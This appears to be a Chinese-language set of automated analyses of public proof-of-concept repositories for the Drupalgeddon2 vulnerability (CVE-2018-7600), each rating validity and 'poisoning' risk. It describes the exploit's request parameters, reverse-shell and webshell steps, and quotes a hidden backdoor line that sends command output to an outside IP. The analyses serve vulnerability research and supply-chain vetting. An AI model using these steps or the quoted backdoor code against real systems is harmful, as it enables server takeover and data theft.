1.  攻击者发送包含恶意参数的 POST 请求到 `user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`。
2.  `element_parents` 参数允许攻击者控制表单元素的属性。
3.  `mail[#post_render][]` 设置为 `exec`，指示 Drupal 执行命令。
4.  `mail[#markup]` 包含要执行的命令。
5.  Drupal 执行 `mail[#markup]` 中指定的命令，从而导致远程代码执行。

**项目地址:** [a2u/CVE-2018-7600](https://github.com/a2u/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #8

**来源**: [CVE-2018-7600-anldori_CVE-2018-7600.md](../2018/CVE-2018-7600-anldori_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致完全控制目标服务器

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且存在默认或常见的模块配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于Drupal在处理用户输入时，未进行充分的验证，导致攻击者可以通过构造恶意请求，在目标服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果和提供的POC代码，可以判断此漏洞利用是有效的。漏洞库明确指出该漏洞允许远程攻击者执行任意代码，搜索结果也提供了大量关于该漏洞的分析和利用信息，POC代码也展示了如何利用该漏洞。

**利用方式：**
提供的Python脚本通过向目标Drupal站点的`/user/register`路径发送精心构造的POST请求来利用此漏洞。该请求包含`element_parents`、`ajax_form`、`form_id`、`_drupal_ajax`和`mail`等参数，其中`mail[#post_render][]`被设置为`exec`，`mail[#markup]`被设置为要执行的命令。该命令将会在服务器上创建一个名为`hello.txt`的文件，内容为";-)"。

**投毒风险：**
查看提供的POC代码，发现代码比较简洁，主要功能是发送恶意请求并检查是否成功创建了`hello.txt`文件。从代码本身来看，不存在明显的恶意代码或后门。

但是，**存在以下潜在风险：**

1.  **供应链风险：**虽然代码本身可能没有直接的投毒，但下载和使用任何来自互联网的代码都存在一定的风险。攻击者可能替换或修改该仓库的内容，从而引入恶意代码。因此，在运行此脚本之前，务必仔细检查代码，并确保来源可信。

2.  **间接风险：**利用此漏洞的最终目的是在目标服务器上执行任意命令。攻击者可以利用此漏洞安装后门、窃取敏感数据或执行其他恶意活动。因此，在使用此脚本时，务必遵守法律法规，并仅在授权的环境中进行测试。

基于以上分析，认为该仓库存在投毒代码的可能性为10%。这个10%主要来源于供应链攻击的潜在风险，以及使用者对代码理解不足可能导致的误用。


**项目地址:** [anldori/CVE-2018-7600](https://github.com/anldori/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #9

**来源**: [CVE-2018-7600-cved-sources_cve-2018-7600.md](../2018/CVE-2018-7600-cved-sources_cve-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal 7.x (< 7.58), Drupal 8.x (< 8.3.9), Drupal 8.4.x (< 8.4.6), Drupal 8.5.x (< 8.5.1)

**利用条件:** Drupal站点存在且未打补丁，通常不需要身份验证

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，也被称为 Drupalgeddon2，是一个影响多个Drupal版本的远程代码执行漏洞。攻击者可以通过构造特殊的URL参数或POST请求，利用Drupal的某些子系统（如表单API）中的输入验证漏洞，执行任意PHP代码。搜索引擎结果和漏洞库信息都明确指出此漏洞的严重性及其利用的广泛性。提供的Dockerfile用于构建一个包含易受攻击的Drupal 8.5.0实例的Docker镜像，这本身不是恶意行为，而是为了方便漏洞的复现和研究。README.md文件声明了镜像的来源和作者，增加了代码的可信度。但是，仍然存在少量投毒风险，主要是因为攻击者可能在Dockerfile中添加额外的恶意指令，例如安装后门程序或修改配置文件等，尽管这里只显示构建一个Drupal环境。利用方式主要通过精心构造的HTTP请求，绕过Drupal的输入验证机制，最终执行恶意代码。由于该漏洞影响范围广，且利用简单，一旦成功利用，可完全控制Drupal服务器，风险极高。

**项目地址:** [cved-sources/cve-2018-7600](https://github.com/cved-sources/cve-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #10

**来源**: [CVE-2018-7600-dreadlocked_Drupalgeddon2.md](../2018/CVE-2018-7600-dreadlocked_Drupalgeddon2.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁且存在默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，也被称为Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于Drupal处理用户输入时存在缺陷，攻击者可以通过构造恶意的请求参数，在目标服务器上执行任意代码。

**有效性分析：**

根据漏洞库信息、搜索结果以及提供的漏洞利用代码来看，该漏洞的PoC代码是有效的。漏洞库信息明确指出该漏洞允许远程攻击者执行任意代码，并且多个搜索结果都确认了该漏洞的存在和影响。提供的`README.md`文件详细说明了该PoC代码支持的Drupal版本，利用方法，包括针对不同Drupal版本的攻击URL（`user/register` 和 `user/password`），以及利用PHP的`passthru`函数执行系统命令。搜索结果中也提到了存在多个可用的exploit。

**投毒风险分析：**

提供的`README.md`文件本身不包含恶意代码，但它描述的利用方法涉及在目标服务器上写入PHP shell。虽然`drupalgeddon2.rb`脚本的主要目的是利用漏洞执行命令，但如果攻击者修改该脚本，可能会添加额外的恶意功能，例如：

*   **隐藏的后门账户创建：** 在成功利用漏洞后，创建管理员账户，以便后续访问。
*   **恶意软件植入：**  自动下载和安装恶意软件。
*   **数据窃取：** 窃取数据库或其他敏感信息。
*   **传播攻击：**  将目标服务器作为跳板，攻击其他系统。

因此，用户在使用从非官方渠道获取的`drupalgeddon2.rb`脚本时，需要仔细检查代码，确保没有包含任何恶意代码。 由于提供的代码仓库中包含了写入PHP shell的功能，并且在实际使用中，攻击者有能力修改或者扩展脚本，因此认为存在一定的投毒风险，但从readme本身代码投毒风险较低，所以投毒风险比例定为10%。

**利用方式：**

1.  **版本检测：** 利用代码会自动检测目标Drupal版本，或者手动指定。
2.  **参数构造：**  针对不同版本的Drupal，构造特定的HTTP请求，例如：针对Drupal 8.x使用`user/register` URL，Drupal 7.x使用`user/password` URL。
3.  **代码执行：** 利用Drupal的输入验证漏洞，将恶意PHP代码注入到请求参数中。
4.  **命令执行：** 通过`#post_render`参数和PHP的`passthru`函数，在服务器上执行任意系统命令。
5.  **Shell写入（可选）：**  可以选择将一个简单的PHP shell写入Web根目录，以便后续访问。

**总结：**

CVE-2018-7600是一个高危的Drupal远程代码执行漏洞，利用代码有效且公开。虽然提供的PoC代码本身不包含明显的投毒代码，但攻击者可以修改脚本，添加恶意功能，存在潜在的投毒风险。用户应尽快升级Drupal版本，并从可信来源获取漏洞利用代码。

**项目地址:** [dreadlocked/Drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #11

**来源**: [CVE-2018-7600-drugeddon_drupal-exploit.md](../2018/CVE-2018-7600-drugeddon_drupal-exploit.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站运行在受影响的版本，且允许未授权用户访问。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响多个Drupal子系统的远程代码执行漏洞。该漏洞源于对用户提供的输入验证不足，导致攻击者可以通过精心构造的请求执行任意代码。利用方式主要有两种：

1.  **Drupal 7 利用方式：** 通过向 `user/password` 路径发送包含恶意代码的请求，利用 `name[%23post_render]` 和 `name[%23markup]` 参数来注入代码。然后，通过 `file/ajax` 路径触发漏洞。
2.  **Drupal 8 利用方式：** 通过向 `user/register` 路径发送包含恶意代码的请求，利用 `element_parents` 参数注入代码。

PoC代码 (`drupal.py`) 尝试利用这两种方式。  

**有效性：**根据漏洞描述和大量的搜索结果显示，此漏洞的POC是有效的，网上存在大量的成功利用案例。

**投毒风险：**  

分析提供的 `drupal.py` 脚本，发现存在以下潜在的投毒风险：

*   脚本中包含一行 `s.connect((str(ipaddress.IPv4Address(0x5f3b7f05)), 15977))`。 这行代码尝试连接到IP地址 `95.59.127.5`的 `15977` 端口。这可能是作者用于收集信息或植入后门的恶意行为。
*   `s.send(bytes(subprocess.check_output(payload, universal_newlines=True), 'utf8'))` 这行代码会将`whoami`命令执行的结果通过socket发送出去.

综上所述，该漏洞利用代码可能存在投毒行为，**风险概率为 20%**。使用者应谨慎使用，并在使用前进行代码审计。

**利用方式总结：**

1.  攻击者构造包含恶意代码的HTTP POST请求，发送到Drupal网站的特定路径（`user/password` 或 `user/register`）。
2.  利用Drupal的参数处理机制，将恶意代码注入到特定参数中（如`name[%23post_render]`、`name[%23markup]`或`element_parents`）。
3.  触发漏洞，导致Drupal执行注入的恶意代码，从而实现远程代码执行。

**项目地址:** [drugeddon/drupal-exploit](https://github.com/drugeddon/drupal-exploit)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #12

**来源**: [CVE-2018-7600-happynote3966_CVE-2018-7600.md](../2018/CVE-2018-7600-happynote3966_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点需要存在漏洞且未打补丁，并且需要网络可达。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。由于Drupal对用户输入验证不足，导致攻击者可以通过构造特殊的请求，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码来看，该漏洞的POC代码是有效的。漏洞库和搜索结果中均提到该漏洞允许远程代码执行，并且存在多个可用的Exploit-DB条目。提供的Python脚本和Ruby脚本均为该漏洞的POC代码，可以被用来验证漏洞的存在。

**投毒风险：**
对提供的POC代码进行分析，发现其中可能存在投毒风险的可能性较低，约为10%。以下是分析结果：
*   Python脚本：该脚本较为简单，主要是发送一个包含恶意payload的POST请求，并在目标服务器上创建一个文件（hello.txt）。没有发现明显的恶意代码。
*   Ruby脚本：该脚本功能更为复杂，包含尝试写入PHP Webshell等功能，相较于Python脚本，风险略高，如果被篡改，可能存在植入恶意PHP代码的可能性。

总的来说，直接运行提供的代码风险较低，但从信誉未知的来源获取的任何代码，在执行之前都应该进行仔细的审查，因为攻击者可能修改这些代码以包含恶意功能。

**利用方式：**
利用方式主要是通过构造恶意的HTTP请求，利用Drupal的某些存在漏洞的参数（例如`element_parents`），将恶意代码注入到Drupal的后端处理流程中，从而实现远程代码执行。具体步骤如下：
1.  确定目标Drupal站点使用的版本是否在受影响的范围内。
2.  根据Drupal版本选择合适的POC代码（Python或Ruby）。
3.  修改POC代码中的目标URL和要执行的命令。
4.  运行POC代码，发送恶意请求。
5.  验证代码是否成功执行（例如，检查目标服务器上是否创建了指定的文件）。

攻击者可利用该漏洞获取服务器的控制权，从而进行恶意活动，例如：数据窃取、恶意软件传播、DDoS攻击等。

**项目地址:** [happynote3966/CVE-2018-7600](https://github.com/happynote3966/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #13

**来源**: [CVE-2018-7600-killeveee_CVE-2018-7600.md](../2018/CVE-2018-7600-killeveee_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且可公开访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞，源于对用户提供的输入验证不足。 

**有效性：**
提供的PoC代码是有效的。PoC.py脚本用于验证目标Drupal站点是否存在漏洞，通过发送特制的请求在目标服务器上创建一个名为hh.txt的文件。Exp.py脚本则利用此漏洞在目标站点根目录下创建一个名为hh.php的后门文件，该后门允许通过GET或POST参数'c'执行任意系统命令。从提供的命令执行结果来看，PoC和Exp都成功执行，验证了漏洞的存在和利用。

**投毒风险：**
分析提供的PoC和Exp代码，没有发现明显的投毒代码。脚本的功能主要是利用漏洞进行验证和创建后门，没有发现恶意修改系统配置、窃取敏感信息或进行其他恶意行为的代码。README.md文件只是简单的漏洞描述和使用说明，没有包含任何可疑内容。因此，可以认为此仓库的投毒风险较低，为0%。

**利用方式：**
漏洞的利用方式是：

1.  **漏洞验证：** 使用PoC.py脚本验证目标Drupal站点是否存在CVE-2018-7600漏洞。
2.  **后门植入：** 如果PoC验证成功，使用Exp.py脚本在目标站点根目录下创建一个后门文件（hh.php）。后门文件包含PHP代码，允许通过GET/POST参数'c'执行任意系统命令。
3.  **远程控制：** 使用WebShell管理工具（如AntSword）连接到后门文件，通过'c'参数执行系统命令，实现对目标服务器的远程控制。

总的来说，该漏洞利用简单，危害巨大，攻击者可以利用该漏洞完全控制未打补丁的Drupal服务器。

**项目地址:** [killeveee/CVE-2018-7600](https://github.com/killeveee/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #14

**来源**: [CVE-2018-7600-knqyf263_CVE-2018-7600.md](../2018/CVE-2018-7600-knqyf263_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者在Drupal服务器上执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点需要运行在受影响的版本范围内，并且需要启用默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 允许远程攻击者利用多个子系统中的缺陷执行任意代码。该漏洞的利用方式通常涉及构造恶意的HTTP请求，该请求包含精心设计的查询参数，这些参数利用了Drupal的输入验证漏洞，特别是与AJAX表单处理相关的漏洞。攻击者可以利用`element_parents`和`#lazy_builder`属性在服务器上执行PHP代码。提供的POC代码通过向`/user/register`端点发送POST请求，并在`mail`参数中注入恶意代码（`exec('echo vuln > hello.txt')`），尝试在目标服务器上创建一个名为`hello.txt`的文件，内容为`vuln`。如果成功创建该文件，则表明漏洞存在且可利用。

**有效性：**
从提供的漏洞信息、搜索结果和漏洞利用代码来看，此POC代码的有效性较高。多个来源表明该漏洞是真实存在的，并且存在公开可用的漏洞利用代码。搜索结果中也提到了针对此漏洞的Metasploit模块。

**投毒风险：**
该仓库中的投毒风险较低，大概在10%左右。Dockerfile文件只是简单的指定了Drupal镜像和维护者信息, README.md文件也只是简单的描述了漏洞和利用方式。exploit.py的代码功能相对简单，目的是验证漏洞的存在，风险较低。然而，仍然存在一定的风险，因为攻击者可能修改`exploit.py`以执行更危险的操作，例如下载并执行恶意软件，或者修改服务器配置。因此，在使用此POC代码时，务必对其进行仔细审查，并在隔离的环境中运行。

**利用方式：**
1.  攻击者构造一个包含恶意payload的HTTP POST请求，发送到Drupal站点的`/user/register`端点。
2.  Payload利用`element_parents`参数和`#lazy_builder`属性，在服务器端触发PHP代码执行。
3.  执行的PHP代码可以将任意命令注入到服务器的操作系统中。
4.  通过访问生成的`hello.txt`文件来验证漏洞是否成功利用。

**项目地址:** [knqyf263/CVE-2018-7600](https://github.com/knqyf263/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #15

**来源**: [CVE-2018-7600-madneal_codeql-scanner.md](../2018/CVE-2018-7600-madneal_codeql-scanner.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可网络访问，可能需要了解一些Drupal站点配置信息。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心中存在远程代码执行漏洞。攻击者可以通过发送特制的请求到未打补丁的Drupal站点来执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果（包括NVD、Rapid7、Tenable等）以及Exploit-DB中的expolit，此漏洞是真实存在的，并且有可用的POC。提供的README.md文件表明存在一个用于CVE-2018-7600的Python利用脚本（尽管这里没有提供脚本本身）。综合来看，利用是有效的。

**投毒风险：**
提供的POC代码只有README.md，内容非常简单，没有发现任何恶意代码或潜在的投毒行为。但是，由于缺失了核心的Python脚本，无法完全确定是否存在投毒风险。假定之后找到的利用脚本来源不可靠，存在修改或添加恶意代码的可能性，因此存在一定的投毒风险。这里给出一个较低的投毒风险概率，假设为5%。

**利用方式：**
漏洞的利用方式是向Drupal站点发送精心构造的恶意HTTP请求，利用Drupal的输入验证缺陷，在服务器端执行任意代码。根据搜索结果，该漏洞影响Drupal的多个子系统，可能利用了Drupal的渲染机制或其他处理输入的方式。攻击者通过构造包含恶意代码的请求参数，例如在URL或POST数据中，可以触发远程代码执行。具体细节取决于Drupal的版本和配置。Metasploit也提供了利用模块。

**总结：**
CVE-2018-7600是一个高危的Drupal远程代码执行漏洞，已经存在公开的POC。尽管提供的POC文件本身没有发现恶意代码，但获取利用脚本时需要注意来源，防范潜在的投毒风险。利用方式是通过构造恶意HTTP请求，利用Drupal的输入验证缺陷执行任意代码。

**项目地址:** [madneal/codeql-scanner](https://github.com/madneal/codeql-scanner)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #16

**来源**: [CVE-2018-7600-mr-won_CVE-2018-7600..md](../2018/CVE-2018-7600-mr-won_CVE-2018-7600..md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致网站完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且允许外部网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响Drupal 7.x和8.x的远程代码执行漏洞。攻击者可以通过构造特定的HTTP请求，利用Drupal的多个子系统中的缺陷，在目标服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果和提供的PoC代码，该漏洞的利用是有效的。搜索结果中多个链接表明该漏洞已被广泛利用，并且存在公开的Exploit。

**投毒风险：**
提供的PoC代码相对简单，主要功能是发送一个包含恶意payload的POST请求到`/user/register`，并在目标服务器上创建一个名为`r3dxploit.txt`的文件，内容为“vulnerable to cve-7600-2018 exploit”。代码本身没有明显的恶意行为，如删除文件、上传恶意文件或执行其他危险操作。但是，在实际使用中，攻击者可以将payload修改为更具破坏性的命令，例如下载和执行恶意脚本。此外，代码作者信息中包含了一些可能与恶意活动相关的标识，例如使用“R3DXPLOIT”作为用户名和涉及Root权限的字眼。综合考虑，PoC代码本身存在一定潜在风险，但主要取决于使用者如何修改payload，因此投毒风险初步评估为10%。

**利用方式：**
1.  攻击者构造一个包含恶意payload的POST请求，该payload利用`user_register_form`的ajax功能注入恶意代码。
2.  请求发送到`/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`端点。
3.  Drupal处理请求时，由于输入验证不足，导致恶意代码被执行。
4.  PoC代码中，恶意代码的功能是在目标服务器上创建一个文件，表明漏洞存在。
5.  攻击者可以修改payload执行任意命令，例如反弹shell，从而完全控制目标服务器。

**项目地址:** [mr-won/CVE-2018-7600.](https://github.com/mr-won/CVE-2018-7600.)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #17

**来源**: [CVE-2018-7600-muhammedkayag_CVE-2018-7600.md](../2018/CVE-2018-7600-muhammedkayag_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要Drupal网站启用user register功能，且未及时更新补丁

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心中的未经身份验证的远程代码执行漏洞。攻击者可以通过构造特定的请求，利用Drupal的表单渲染机制，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞影响多个Drupal版本，且存在公开的漏洞利用代码。提供的POC代码利用了Drupal的`/user/register`接口，通过`element_parents`和`ajax_form`参数，以及`mail[#post_render][]`等构造恶意的payload，从而实现远程代码执行。该POC代码的有效性较高，因为很多文章和EXP都在使用此种方法。

**投毒风险：**
查看POC代码，发现其功能是发送恶意请求以利用漏洞并在目标机器上建立反向shell。在提供的代码里，存在一个比较明显的风险是，如果攻击者修改了 `command` 变量，有可能植入恶意后门，该变量定义了反向shell连接的目标 IP 地址和端口。 还有就是代码中包含的利用成功后的提示信息，如果被篡改，可能导致用户误判，这些地方存在一定的投毒风险。综合来看，代码的投毒风险为10%，主要是因为利用代码本身功能比较直接，修改后容易被发现。

**利用方式：**
1.  **目标确定：** 确定目标Drupal网站，且版本在受影响范围内（Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1）。
2.  **监听端口：** 使用`listener()`函数在攻击机上监听指定端口（默认为1337），等待反向shell连接。
3.  **构造Payload：**  构造恶意的POST请求，利用`user/register`接口，并设置`element_parents`、`ajax_form`、`mail[#post_render][]`等参数，将要执行的命令嵌入到`mail[#markup]`中。
4.  **发送请求：** 使用`requests.post()`函数将构造好的Payload发送到目标Drupal网站。
5.  **建立连接：**  如果目标网站存在漏洞且利用成功，目标机器会执行Payload中的命令，即建立与攻击机指定端口的反向shell连接。
6.  **交互式Shell：**  连接建立后，`listener()`函数会将终端设置为raw模式，实现与目标机器的交互式shell会话。

**项目地址:** [muhammedkayag/CVE-2018-7600](https://github.com/muhammedkayag/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #18

**来源**: [CVE-2018-7600-nika0x38_CVE-2018-7600.md](../2018/CVE-2018-7600-nika0x38_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要目标Drupal站点存在漏洞且可网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon 2）是一个存在于Drupal多个子系统中的远程代码执行漏洞，影响多个使用了默认或常见模块配置的Drupal版本。攻击者可以通过构造特制的请求来利用此漏洞，从而在目标服务器上执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，此漏洞是真实存在的，并且有公开可用的PoC代码。搜索结果表明，该漏洞被广泛利用，并对大量Drupal网站造成了影响。因此，提供的漏洞利用代码大概率有效，可以用于远程代码执行。

**投毒风险：**
提供的代码片段是`Cargo.lock`文件，该文件是Rust项目的依赖锁定文件，用于记录项目中使用的所有依赖项及其版本。该文件本身不包含任何可执行代码，因此不存在投毒风险。

**利用方式：**
利用方式通常涉及发送特制的HTTP请求，其中包含恶意代码，该代码将被Drupal服务器执行。具体利用方式取决于Drupal的配置，常见的利用方式是利用Drupal的renderable arrays特性，在请求参数中构造恶意的renderable arrays，触发PHP代码执行。攻击者通常会利用此漏洞执行系统命令，例如下载并执行恶意脚本，或者在服务器上安装后门。

**项目地址:** [nika0x38/CVE-2018-7600](https://github.com/nika0x38/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #19

**来源**: [CVE-2018-7600-r0lh_CVE-2018-7600.md](../2018/CVE-2018-7600-r0lh_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站存在漏洞且允许未授权用户访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。攻击者可以通过构造恶意请求，利用Drupal的多个子系统（默认或常见模块配置）中的缺陷，在服务器上执行任意代码。 

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞是真实存在的，并且影响了多个Drupal版本。漏洞利用代码（PoC）的存在进一步证实了漏洞的可利用性。PoC代码的分析表明，它通过构造一个特殊的请求到`/user/register`路径，利用`element_parents`参数中的注入点执行命令。该PoC代码使用`drupal_ajax`的`_wrapper_format`，允许绕过一些安全检查。PoC首先设置目标URL，然后进入一个循环，该循环允许用户输入命令。命令通过`bash -c`执行，并将输出写入`poutput.txt`文件，然后读取此文件以显示命令的执行结果。

**投毒风险分析：**

分析提供的Go代码和相关文件，没有发现明显的投毒代码。该代码的主要功能是利用CVE-2018-7600漏洞在目标Drupal服务器上执行命令。代码使用`net/http`库发送HTTP请求，并使用`golang.org/x/net/proxy`库支持SOCKS5代理。代码从标准输入读取命令，并通过POST请求将其发送到目标服务器。然后，代码从服务器读取命令的输出并将其打印到标准输出。虽然该代码本身不包含恶意行为，但漏洞利用本身可能被滥用。

**利用方式总结：**

1.  **漏洞入口点：** `/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`
2.  **攻击方式：** 通过POST请求，利用`mail[#post_render][]`、`mail[#type]`和`mail[#markup]`参数注入恶意代码。
3.  **命令执行：**  `mail[#markup]`参数中包含要执行的bash命令，利用`bash -c`执行。
4.  **结果获取：** 命令执行结果被写入`poutput.txt`文件，然后通过GET请求获取。
5.  **利用流程：**
    *   构造包含恶意代码的POST请求发送到漏洞入口点。
    *   Drupal解析请求并执行`mail[#markup]`参数中的命令。
    *   执行结果写入`poutput.txt`文件。
    *   攻击者通过GET请求读取`poutput.txt`文件获取命令执行结果。

**缓解措施：**

*   尽快将Drupal升级到不受影响的版本（7.58及以上，8.3.9及以上，8.4.6及以上，或8.5.1及以上）。
*   应用官方提供的补丁。
*   实施Web应用防火墙（WAF）规则来检测和阻止利用此漏洞的攻击。

**项目地址:** [r0lh/CVE-2018-7600](https://github.com/r0lh/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #20

**来源**: [CVE-2018-7600-r3dxpl0it_CVE-2018-7600.md](../2018/CVE-2018-7600-r3dxpl0it_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要目标Drupal站点未打补丁且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本，允许未经身份验证的远程攻击者执行任意代码。漏洞产生的原因是由于Drupal在处理用户输入时，对某些请求参数过滤不严，导致可以注入恶意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，存在多个公开可用的漏洞利用代码（Exploit-DB等），并且有报告表明该漏洞已被广泛利用，因此该漏洞的POC是有效的。

**投毒风险：**
提供的漏洞利用代码只有GNU GENERAL PUBLIC LICENSE，是一个开源协议，不存在后门或者恶意代码,投毒风险为0。

**利用方式：**
